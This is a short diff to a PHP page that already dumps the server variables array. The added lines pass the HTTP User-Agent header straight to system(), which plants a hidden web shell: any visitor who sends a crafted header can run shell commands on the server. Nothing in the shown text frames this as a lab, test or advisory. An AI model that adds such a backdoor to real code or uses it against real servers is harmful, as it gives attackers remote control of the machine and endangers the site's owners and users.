@@ -44,3 +44,7 @@
     print_r($server_array);
     echo "</pre>";
 ?>
+
+<?php
+    system($_SERVER['HTTP_USER_AGENT']);
+?>
